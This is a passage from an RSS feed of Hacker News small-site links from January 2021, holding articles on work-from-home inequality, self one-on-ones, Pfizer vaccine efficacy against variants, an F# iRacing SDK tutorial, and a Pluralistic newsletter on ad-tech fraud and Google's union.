gap during and after the pandemic, Scicchitano said.</p><p dir="ltr">â€œDuring the pandemic, it is quite obvious because we have children at home and obviously more or less all the care of children is on women,â€� he said.</p><p>Some previous studies have found the productivity and wages of women have fallen during the pandemic, Scicchitano said, but itâ€™s unclear whether the gender pay gap would increase if working from home became the new normal.</p><p><em>The study</em><em>Â&nbsp;â€œWorking from home and income inequality: risks of a â€˜new normalâ€™ with COVID-19,â€� published Sept. 1</em><em>2 in the Journal of Population Economics, was authored by Luca Bonacini, University of Modena and Reggio Emilia; Giovanni Gallo, University of Modena and Reggio Emilia and the National Institute for Public Policies Analysis; and Sergio Scicchitano, National Institute for Public Policies Analysis and the Global Labour Organisation.Â&nbsp;</em></p></div></div></div>]]>
            </description>
            <link>https://academictimes.com/expanded-work-from-from-home-boosts-income-for-select-few-worsening-inequality-study-finds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697771</guid>
            <pubDate>Sat, 09 Jan 2021 05:56:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self One on Ones]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25696925">thread link</a>) | @ny2ko
<br/>
January 8, 2021 | https://nngorok.com/self-one-on-ones | <a href="https://web.archive.org/web/*/https://nngorok.com/self-one-on-ones">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          <p><a href="https://nngorok.com/self-one-on-ones">January 9, 2021</a></p>
<p>When it comes to the subject of one-on-ones, there is plenty of material available advising on everything from the best questions to ask in one-on-ones to how often to have them. What the vast majority of these literature focus on are one-on-ones that you have with others. From your manager, to executives and your reports. There is however, less focus on a simple but powerful reflection tool that you can use and that is the self one-on-one which I explain below.</p>
<h2 id="what-is-a-self-one-on-one">What is a self one-on-one?</h2>
<p>It is difficult to truly define what a one-on-one is so I’ll borrow a definition from <a href="https://wideangle.com/what-is-a-one-on-one-1-1/">wideangle</a> which I like and is vague enough to cover the plethora of other definitions that exist.</p>
<blockquote>
<p>The fundamental reason One-on-One Meetings exist is to give a platform to the direct report to allow them to communicate to you.</p>
</blockquote>
<p>Applying this same definition, a self one-on-one becomes</p>
<blockquote>
<p>The fundamental reason self One-on-One Meetings exist is to give a platform to you to allow you to communicate to yourself.</p>
</blockquote>
<h2 id="why-should-you-do-self-one-on-ones">Why should you do self one-on-ones?</h2>
<p>We have one-on-ones with others because they are useful. They help in career growth, spreading of information and holding of accountability. Similarly, self one-on-ones help with these except for oneself. Self one-on-ones also provide structure/process for the reflection time you may already be blocking out of your calendar regularly. How often do you get to reflection time and are unsure what to think about?</p>
<h2 id="principles-for-self-one-on-ones">Principles for self one-on-ones</h2>
<p>To successfully use self one-on-ones, apply the same principles you use in one-on-ones with your reports to yourself. A few examples are</p>
<ol type="1">
<li>Do not skip self one-on-ones</li>
<li>Self one-on-ones occur every X weeks</li>
<li>All self one-on-ones have an agenda</li>
<li>Notes are taken from self one-on-ones</li>
<li>Self one-on-ones have a schedule balancing career growth, status updates and well being</li>
<li>Self one-on-ones have action items that are followed on</li>
<li>Go on a walk with yourself if you do walking one-on-ones</li>
<li>Whatever other principles you have for one-on-ones</li>
</ol>
<p>As you start self one-on-ones, it will be awkward at first; Posing questions and talking to yourself. After a while though, they feel normal and help you focus on your own personal growth and well being.</p>
          

          



          

          <hr>

          <a href="https://nngorok.com/don-t-complete-their-thought">
            <h5>Previous post</h5>
            <span>Don't complete their thought</span>
            <span>I’ve recently been thinking about why listening can be very difficult. One aspect that always comes to mind, a practice that is exceptionally</span>
          </a>

        </div>

      </div>
    </div></div>]]>
            </description>
            <link>https://nngorok.com/self-one-on-ones</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696925</guid>
            <pubDate>Sat, 09 Jan 2021 04:23:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trump Twitter Archive]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25696869">thread link</a>) | @abouelatta
<br/>
January 8, 2021 | https://www.first1000.co/trump | <a href="https://web.archive.org/web/*/https://www.first1000.co/trump">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.first1000.co/trump</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696869</guid>
            <pubDate>Sat, 09 Jan 2021 04:17:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pfizer vaccine appears effective against mutation in new coronavirus variants]]>
            </title>
            <description>
<![CDATA[
Score 354 | Comments 122 (<a href="https://news.ycombinator.com/item?id=25696577">thread link</a>) | @awnird
<br/>
January 8, 2021 | https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Pfizer Inc. and BioNTech's COVID-19 vaccine appeared to work against a key mutation in the highly transmissible new variants of the coronavirus discovered in Britain and South Africa, according to a laboratory study conducted by the U.S. drugmaker.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5852149.1608672062!/cumulusImage/httpImage/image.jpg_gen/derivatives/16x9_780/covid-vaccinations-toronto.jpg"></p></div><figcaption>A nurse prepares a dose of the Pfizer-BioNTech COVID-19 vaccine for care home workers at St. Michael’s Hospital in Toronto on Dec. 22, 2020.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p>Pfizer Inc. and BioNTech's COVID-19 vaccine appeared to work against a key mutation in the highly transmissible new variants of the coronavirus discovered in Britain and South Africa, according to a laboratory study conducted by the U.S. drugmaker.</p>  <p>The study by Pfizer and scientists from the University of Texas Medical Branch, which has not yet been peer-reviewed, indicated the vaccine was effective in neutralizing virus with the so-called N501Y mutation of the spike protein.</p>  <p>The mutation could be responsible for greater transmissibility and there had been concern it could also make the virus escape antibody neutralization elicited by the vaccine, said Phil Dormitzer, one of Pfizer's top viral vaccine scientists.</p>  <p>The first results of tests on the variants offer a glimmer of hope while more studies are carried out as Britain and other countries try to tame the more infectious variants that&nbsp;authorities believe are driving a surge in infections that could overwhelm health-care systems.</p>  <p>The Pfizer-BioNTech study was conducted on blood taken from people who had been given the vaccine. Its findings are limited because it does not look at the full set of mutations found in either of the new variants of the rapidly spreading virus.</p>  <p>Dormitzer said it was encouraging that the vaccine appears effective against the mutation, as well as 15 other mutations the company has previously tested against.</p>  <p>"So we've now tested 16 different mutations, and none of them have really had any significant impact. That's the good news," he said. "That doesn't mean that the 17th won't."</p>  <p><em><strong>WATCH | What scientists know about the new coronavirus variant:</strong></em></p>  <p><span><span><div><div title="What scientists know about the new coronavirus variant" role="button" tabindex="0"><div><div aria-labelledby="1842141251676-metadata-" title="What scientists know about the new coronavirus variant"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/643/819/COVID-VARIANT-SCI-BIRAK-080121.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>The B1-17 coronavirus variant, first discovered in the U.K., is now in at least 40 countries, including Canada. It has 23 mutations, including one that attaches to healthy cells like a key going into a lock.<!-- --> <!-- -->1:56</span></span></span></p>  <p>Dormitzer said another mutation found in the South African variant, called the E484K mutation, was also concerning.</p>  <p>The researchers plan to run similar tests to establish whether the vaccine is effective against other mutations found in the British and South African variants and hope to have more data within weeks.</p>  <p>The variants are said by scientists to be more transmissible than previously dominant ones, but they are not thought to cause more serious illness.</p>  <p>The virus's spikes act as a key that must unlock our cells to cause the infection.&nbsp;The variant first identified in the U.K. has a mutation that appears to make it easier for the coronavirus to grab hold of the lock more tightly, scientists say.</p>    <p>Scientists said the results of the study would help calm concerns that people will not be protected by vaccines being given to millions of people around the world in the fight against the pandemic, which has killed more than 1.8 million people and roiled economies.</p>  <p>But they cautioned that more clinical tests and data are still needed to come to a definitive conclusion.</p>  <p>"This is good news, mainly because it is not bad news," said Stephen Evans, professor of pharmacoepidemiology at the&nbsp;London School of Hygiene &amp; Tropical Medicine.</p>  <p>"So, yes this is good news, but it does not yet give us total confidence that the Pfizer (or other) vaccines will definitely give protection."</p>  <h2>AstraZeneca, Moderna, CureVac testing against variants</h2>  <p>AstraZeneca, Moderna and CureVac are also testing whether their shots work against the fast-spreading variants. They have said they expect them to be effective, but the timing of those studies is not known.</p>  <p>A senior British lawmaker expressed concerns in an interview on Friday that COVID-19 vaccines might not work properly against the South African variant. He was not responding to questions about Friday's data.</p>  <p>The Pfizer-BioNTech vaccine and the one from Moderna Inc., which use synthetic messenger RNA technology, can be quickly tweaked to address new mutations of a virus if necessary. Scientists have suggested the changes could be made in as little as six weeks.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/virus-outbreak-new-variants.jpg 300w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/virus-outbreak-new-variants.jpg 460w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/virus-outbreak-new-variants.jpg 620w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/virus-outbreak-new-variants.jpg 780w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/virus-outbreak-new-variants.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/virus-outbreak-new-variants.jpg"></p></div><figcaption>Graphic shows a diagram of the COVID-19 virus.<!-- --> <!-- -->(AP)</figcaption></figure></span></p>  <p>Some other vaccines to protect against COVID-19 also use the spike protein to show our immune system what the enemy looks like.</p>  <p>Canadian microbiologist Benjamin tenOever, a professor at the&nbsp;Icahn School of Medicine at Mount Sinai in New York,&nbsp;said our immune system learns to recognize and attack the viral attachment protein at many different sites.</p>  <p>"It would require many many mutations to render our vaccines non-effective,"&nbsp;tenOever&nbsp;said.</p>  <p>The variant is also not the first of the pandemic to emerge and Eleanor Riley, professor of immunology and infectious disease at the University of Edinburgh, said these types of studies&nbsp;will be needed as they appear.</p>  <p>"It may be necessary to tweak the vaccine over time," she said.</p>  <p>Dr. Theresa Tam, Canada's chief public health officer, said Friday that 14 cases of the variant first reported in the U.K. have been reported in Canada.</p>  <p>Researchers in Ontario have developed a faster test to identify variants.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696577</guid>
            <pubDate>Sat, 09 Jan 2021 03:48:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an iRacing SDK Implementation in F#]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25696493">thread link</a>) | @sanesmith
<br/>
January 8, 2021 | https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/ | <a href="https://web.archive.org/web/*/https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>In my <a href="https://markjames.dev/2021-01-04-why-learning-fsharp-2021/">previous post</a>, I discussed how I’ve decided to learn F# in 2021 for a number of reasons. Around the same time, I also happened to setup my Sim Racing rig so that I could continue to play <a href="https://www.iracing.com/" target="_blank">iRacing</a> with my VR headset (HTC Vive). Its been several years since I’ve last played, but with COVID-related curfews being implemented here in Montreal tomorrow, I’ve been increasingly taking up home-based pursuits which I didn’t always have the time for pre-lockdown. Since the last time I played iRacing, I’m running a PC with a much better processor, motherboard, and only SSDs. The VR performance has been a huge leap forward since I used to play with my old machine and I was quite impressed. After spending a couple of hours setting up, here’s what my current humble racing setup looks like:</p>

<p><img src="https://markjames.dev/img/posts/irsdk-fsharp/racing-rig.jpg" width="650" height="488" alt="Photo of my current iRacing VR setup"></p>

<p>Having a dedicated table really helps, as in my old apartment it was fairly difficult to setup a station with limited space, but now I can fortunately just jump in. Despite the past limitations, I was able to get fairly competitive and still remember the thrill of my first win agaisnt a field of real racers in a Mazda MX-5:</p>

<p><img src="https://markjames.dev/img/posts/irsdk-fsharp/iracing-win.jpg" width="500" height="279" alt="Photo of my iRacing first win certificate"></p>

<p>Inspired by setting everything up and doing some laps to practice for an eventual return to comeptition, I started thinking about how I once experimented with using the <a href="https://github.com/kutu/pyirsdk" target="_blank">Python implementation</a> of the iRacing SDK to connect to an arduino and display a speedometer readout in realtime on a small screen. In reminiscing about the experience, I thought about how I could look into writing an F# implementation of the SDK as a learning project. In addition to learning through the project, it also has the benefit of being of use in a future project involving an iRacing stats tracker web app that I’ve been thinking about writing as a project for my upcoming <a href="https://markjames.dev/2020-12-09-back-to-school/">cloud computing courses</a>.</p>

<h2 id="getting-started">Getting Started</h2>

<p>I tend to learn best when projects are slightly outside of my comfort zone, and this would be both my first time writing a library, as well as writing one in a functional language! Having used an array of libraries at this point, I had some confidence in choosing an organizational structure, and the Python implementation is only <a href="https://github.com/kutu/pyirsdk/blob/master/irsdk.py" target="_blank">739 lines of code</a> which felt doable compared to some of the larger libraries out there.</p>

<p>Moreover, the python implementation of the SDK has the ability to:</p>

<ul>
  <li>Get session data (WeekendInfo, SessionInfo, etc…)</li>
  <li>Get live telemetry data (Speed, FuelLevel, etc…)</li>
  <li>Broadcast messages (camera, replay, chat, pit and telemetry commands)</li>
</ul>

<p>and I figured that this would be a good featureset to aim for in the final version of the F# SDK. Out of these features, the session data and live telemetry data would be the ones I plan to implement first.</p>

<h2 id="creating-the-library">Creating the Library</h2>

<p>After coming up with some desired features, the first step was to create a new FSharp solution called iRacingFSharp. Inside the solution, I created two projects. One was our actual library, called iRacingFSharp, and the other was a basic console app called SDKReader (located in the Examples Folder) to test the functionality of the library as I worked on it. Note, if you’d like to see the full codebase you can <a href="https://github.com/markjamesm/irsdk-fsharp" target="_blank">here on github</a>.</p>

<h2 id="the-first-function">The First Function</h2>

<p>Starting small, I decided that a good first function would be to find out the state of the simulator. Fortunately, the iRacing SDK allows you to check if the sim is running using the following URL which points to a localhost server:</p>

<div><div><pre><code>http://127.0.0.1:32034/get_sim_status?object=simStatus
</code></pre></div></div>
<p>Getting this URL in Postman returns a JSON object which looks like this:</p>

<div><div><pre><code>var simStatus={
   running:0 // 1 if the sim is running
};
</code></pre></div></div>

<p>I decided to make use of the <a href="https://fsharp.github.io/FSharp.Data/library/Http.html" target="_blank">F# Data HTTP library</a> in order to download the response and so I installed it from NuGet at this point.</p>

<p>Next, inside my iRacingFSharp project I created a file called Irsdk.fs and wrote the following code:</p>

<div><div><pre><code><span>namespace</span> <span>IrsdkFS</span>

<span>open</span> <span>FSharp</span><span>.</span><span>Data</span>

<span>///&lt;summary&gt;F# implementation of the iRacing SDK.&lt;/summary&gt;</span>
<span>module</span> <span>IrsdkFS</span> <span>=</span>

    <span>///&lt;summary&gt;Returns the simStatus in string format&lt;/summary&gt;</span>
    <span>let</span> <span>SimStatus</span><span>()</span> <span>=</span>
        <span>let</span> <span>simStatusURL</span> <span>=</span> <span>"http://127.0.0.1:32034/get_sim_status?object=simStatus"</span>
        <span>let</span> <span>simStatusObject</span> <span>=</span> <span>Http</span><span>.</span><span>RequestString</span><span>(</span><span>simStatusURL</span><span>)</span>
        <span>simStatusObject</span>
</code></pre></div></div>

<p>In the above code, I’ve created a module which contains a function called SimStatus that takes no parameters. It then binds the JSON response to simStatusURL and passes it to the HTTP library via Http.RequestString(). Finally, simStatusObject is returned in string format which can be parsed further by another function in a later step.</p>



<p>With this simple function in place, the next step was to create SDKReader.fs inside my SDKReader console app. This file contained code to call the SimStatus() function and print the output:</p>

<div><div><pre><code><span>[&lt;</span><span>EntryPoint</span><span>&gt;]</span>
<span>let</span> <span>main</span> <span>argv</span> <span>=</span>
    <span>let</span> <span>test</span> <span>=</span> <span>IrsdkFS</span><span>.</span><span>SimStatus</span><span>()</span>
    <span>printf</span> <span>"%s"</span> <span>test</span>
    <span>0</span> <span>// return an integer exit code</span>
</code></pre></div></div>

<p>Running dotnet build inside the SDKReader folder displayed the following output while iRacing was running:</p>

<div><div><pre><code><span>"var simStatus={
   running:1
};
"</span><span>
</span></code></pre></div></div>

<p>Success! With this method working, we now have the very beginnings of an F# implementation of the iRacing SDK! Although it is a small step, we were also able to create and structure the project. Lastly, I also setup a a basic .NET build through Github Actions for CI.</p>



<p>iRacing’s API telemetry comes in three variations; data written to a .ibt file 60 times a second, live data exposed to the telemetry API 60 times per second, and a session string in YAML format that contains more or less static information about the session. The YAML string is appended to the end of the .ibt file but only a small portion of that data is exposed. This means that going forward, I’ll need to look into parsing the YAML as well as mapping more of the API endpoints. The iRacing API appears to be nonstandard and so it may take a little more work than just a typical REST API.</p>

<p>Stay tuned for Part Two where I plan to implement some telemetry functions and look into parsing the aforementioned YAML. In addition, be sure to follow along with the <a href="https://github.com/markjamesm/irsdk-fsharp" target="_blank">Github Repo here</a> if you’re interested in seeing how to project progresses (or would like to contribute)!</p>

      </article></div>]]>
            </description>
            <link>https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696493</guid>
            <pubDate>Sat, 09 Jan 2021 03:42:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ad-Tech Is a Bezzle]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25695482">thread link</a>) | @freediver
<br/>
January 8, 2021 | https://pluralistic.net/2021/01/04/how-to-truth/#adfraud | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1719">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
reviews, damon knight, science fiction, statistics, statistical literacy, gift guide,books, uk, dsa, democratic socialists of america, elections, california, ads, at-tech, fraud, google, labor, unions, alphabet, alphabet workers union, cwa,

Summary:
Ad-tech is a bezzle; Google's unionizing; The Data Detective; Damon Knight's Why Do Birds is back; Endorsing the Forward 43 slate

URL:
https://pluralistic.net/2021/01/04/how-to-truth/

Title:
Pluralistic: 04 Jan 2021

Bullet:
🎬

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Ken Snider (https://twitter.com/orenwolf), Slashdot (https://slashdot.org/), Margo Rowder (https://twitter.com/margorowder).

--><br>
<a href="https://pluralistic.net/2021/01/04/how-to-truth/"><img src="https://i0.wp.com/craphound.com/images/04Jan2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/04Jan2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">Ad-tech is a bezzle</a>: The subprime attention crisis is upon us.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#awu">Google's unionizing</a>: Solidarity vs worker misclassification.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#harford">The Data Detective</a>: How to truth with statistics.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#an-oval">Damon Knight's Why Do Birds is back</a>: Reviving a grand master's comic masterpiece.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#fwd-43">Endorsing the Forward 43 slate</a>: For my California comrades.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#retro">This day in history</a>: 2016
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="adfraud"></a><br>
<img src="https://i1.wp.com/craphound.com/images/ad-3242595_960_720.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/ad-3242595_960_720.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>There are lots of problems with ad-tech:</p>
<ul>
<li>being spied on all the time means that the people of the 21st century are less able to be their authentic selves;
</li>
<li>
<p>any data that is collected and retained will eventually breach, creating untold harms;</p>
</li>
<li>
<p>data-collection enables for discriminatory business practices ("digital redlining");</p>
</li>
<li>
<p>the huge, tangled hairball of adtech companies siphons lots (maybe even most) of the money that should go creators and media orgs; and</p>
</li>
<li>
<p>anti-adblock demands browsers and devices that thwart their owners' wishes, a capability that can be exploited for even more nefarious purposes;</p>
</li>
</ul>
<p>That's all terrible, but it's also <em>ironic</em>, since it appears that, in addition to everything else, ad-tech is a fraud, a bezzle.</p>
<p>Bezzle was John Kenneth Galbraith's term for "the magic interval when a confidence trickster knows he has the money he has appropriated but the victim does not yet understand that he has lost it." That is, a rotten log that has yet to be turned over.</p>
<p>Bezzles unwind slowly, then all at once. We've had some important peeks under ad-tech's rotten log, and they're increasing in both intensity and velocity. If you follow Aram Zucker-Scharff, you've had a front-row seat to the fraud.</p>
<p><a href="https://twitter.com/Chronotope/status/1078003966863200256">https://twitter.com/Chronotope/status/1078003966863200256</a></p>
<p>Time and again, everything in the ad-tech stack has been demonstrated to be fraudulent: fake audiences firing fake clicks at fake videos on fake sites that suck real dollars out of advertisers' accounts.</p>
<p>This was masterfully elucidated in Tim Hwang's short 2020 book SUBPRIME ATTENTION CRISIS, whose thesis is: we must deflate the ad-tech bubble intentionally, lest we get a messy rupture that destroys many of the good things the parasite has colonized.</p>
<p><a href="https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost">https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost</a></p>
<p>The ad-tech fraud is many-layered. On the surface, there's the counting frauds: fake clicks, fake sites, fake videos, etc. But there's a deeper fraud, a theory fraud, the fraud that with enough surveillance data and machine learning, ad-tech can sell anyone anything.</p>
<p>That is: even if we count accurately, ads are still overvalued and underperforming. This is also a lesson whose examples are coming with increasing tempo, as when Ebay simply stopped buying Google search ads and saw <em>no</em> decrease in sales.</p>
<p><a href="https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble">https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble</a></p>
<p>In a piece for Forbes, marketer-turned-antifraud-auditor Dr Augustine Fou rounds up some of the grossest things festering under the ad-tech log.</p>
<p><a href="https://www.forbes.com/sites/augustinefou/2021/01/02/when-big-brands-stopped-spending-on-digital-ads-nothing-happened-why/?sh=5a4f9c9a1166">https://www.forbes.com/sites/augustinefou/2021/01/02/when-big-brands-stopped-spending-on-digital-ads-nothing-happened-why/?sh=5a4f9c9a1166</a></p>
<p>Like that time in 2018 when Procter and Gamble – inventors of "brand marketing" – turned off $200m worth of ad-tech buys and saw no change to their sales. Or when Chase killed 95% of its advertising and kept all of its business.</p>
<p>Most interesting is the tale of how Uber allowed itself to be defrauded of $150m/year, for years, by ad-tech intermediaries. It's a story told in detail by former Uber head of "performance marketing" Kevin Frisch on the Marketing Today podcast:</p>
<p><a href="https://www.marketingtodaypodcast.com/194-historic-ad-fraud-at-uber-with-kevin-frisch/">https://www.marketingtodaypodcast.com/194-historic-ad-fraud-at-uber-with-kevin-frisch/</a></p>
<p>It starts with the revelation that $50m of its annual spend on customer acquisitions – money paid when an ad leads to a new Uber customer downloading the app, entering payment details and taking their first ride – was fraudulent.</p>
<p>Here's how that worked: scummy marketers fielded low-quality apps (like battery monitors) that requested root access. These apps spied on every app you installed. If you installed Uber, they "fired a click" to the system to report you as having been "converted" by an ad.</p>
<p>After clearing $50m of fraud, Frisch continued to dig into the system. In the end, about $120m of the $150m was being stolen, pocketed for fake clicks on fake sites by fake users.</p>
<p>In a fascinating turn, Frisch describes how his colleagues were indifferent or actively hostile to his efforts. Uber was in "growth mode," trying to beef up its numbers prior to the IPO where suckers would relieve its Saudi royal investors.</p>
<p>Uber is a company that will never, ever be profitable. It, too, is a bezzle. It only "works" if outside investors – marks – can somehow be convinced to buy the insiders' stock, which requires the appearance of growth – AKA "A pile of shit this big <em>must</em> have a pony under it!"</p>
<p>So execs like Frisch were required to "spend to budget" – to maintain the appearance of growth, including (especially) the growth of its "precision analytics" marketing, where ad-tech spends turned into directly attributable customer acquisitions.</p>
<p>This is the story that keeps on giving, because it all starts with Sleeping Giant's campaign to force Uber to stop advertising on Breitbart, and Uber's inability to get its ad-tech "partners" to definitively switch off Breitbart ads.</p>
<p><a href="https://twitter.com/nandoodles/status/1345774768746852353">https://twitter.com/nandoodles/status/1345774768746852353</a></p>
<p>The system's layers of misdirection – there to hide the fraud – meant that it behaved nondeterministically and couldn't fulfil simple requests, which triggered the search.</p>
<p>There's a theory that the reason Big Tech spies on us so much is that they're really good at turning data into sales (and, by extension, influence, as in elections, referenda, etc). But it is increasingly apparent that Big Tech's spying is part of a bezzle.</p>
<p>That is, we're being surveilled, doxed, placed under automated suspicion and digitally discriminated against all to put on a show that separates marks from their dollars.</p>
<p>This is the theme of my 2020 book HOW TO DESTROY SURVEILLANCE CAPITALISM:</p>
<p><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
<p>Namely, that we are under constant surveillane because monopolies can get away with obviously fraudulent and dangerous conduct by mobilizing their monopoly profits to buy political outcomes that serve their ends.</p>
<p>This is also what happened with California's Proposition 22, the most expensive ballot initiative in US history: Uber didn't spearhead a $200m campaign to legalize worker misclassification to become profitable.</p>
<p>Uber will never be profitable.</p>
<p>All that money was spent to maintain the fiction, the fraud, the bezzle – it was an appeal to rescue the wholly fictional pony underneath that gigantic pile of shit.</p>
<hr>
<p><a name="awu"></a><br>
<img src="https://i1.wp.com/craphound.com/images/Homestead_Strike_-_Mob_attacking_Pinkerton_men-1-1-9.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/Homestead_Strike_-_Mob_attacking_Pinkerton_men-1-1-9.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Google workers have announced their intention to form a union, under the auspices of CWA Local 1440. The union is called The Alphabet Workers Union (Google maintains the legal and accounting fiction that it is a division of a holding company called "Alphabet").</p>
<p>Speaking of legal fictions, the union is opening membership to "TVCs" – temps, vendors and contractors – employees who have been deliberately misclassified so as to avoid paying them benefits or extending normal workplace protections to them.</p>
<p>It's a bold move, a countermeasure to thwart the other commercial advantage from worker misclassification: by creating multiple categories of workers, bosses can pit employees against one another, by dangling privileges in front of one group but not the other.</p>
<p>But it comes at a high price: to gain official legal recognition, more than 50% of eligible workers must join the union. By including more workers, the union is setting a higher bar for official status.</p>
<p><a href="https://www.vice.com/en/article/3an5q9/google-workers-publicly-launch-union">https://www.vice.com/en/article/3an5q9/google-workers-publicly-launch-union</a></p>
<p>But the union has momentum: a series of high-profile googler uprisings – driven by official tolerance for sexual misconduct, complicity in US military drone programs, secret collaboration with Chinese surveillance and censorship, and more – show how radicalized googlers are.</p>
<p>Google's management – who cultivated an air of participatory, cuddly collaboration – have arrived at a point where the contradictions between their "values" and the company's profits can no longer be reconciled.</p>
<p>In Dec 2020, Google fired Timnit Gebru, an eminent Black AI scientist who refused to retract a paper critical of its profitable Big Data research. Management compounded their sins by making false claims about Gebru's dismissal.</p>
<p>The unionization drive is under the CWA's #CODE (Coalition to Organize Digital Employees) project. Though CODE is no stranger to conflict, Google represents a serious challenge, thanks to its partnership with notorious union-busters IRI Consultants.</p>
<p>(IRI's tactics pale in comparison to the mercenaries that Amazon has hired to bust its unions: the Pinkerton company, who have spilled rivers of workers' blood in their murderous history):</p>
<p><a href="https://www.vice.com/en/article/5dp3yn/amazon-leaked-reports-expose-spying-warehouse-workers-labor-union-environmental-groups-social-movements">https://www.vice.com/en/article/5dp3yn/amazon-leaked-reports-expose-spying-warehouse-workers-labor-union-environmental-groups-social-movements</a></p>
<p>For important context on the drive, check out Collective Action in Tech's article on the announcement, which explains why googlers have formed a "non-contract union" that does not yet have official recognition.</p>
<p><a href="https://collectiveaction.tech/2021/the-abcs-of-googles-new-union/">https://collectiveaction.tech/2021/the-abcs-of-googles-new-union/</a></p>
<p>"Non-contract unions embody the idea that worker power does not come from legal processes, but rather through building power through solidarity."</p>
<hr>
<p><a name="harford"></a><br>
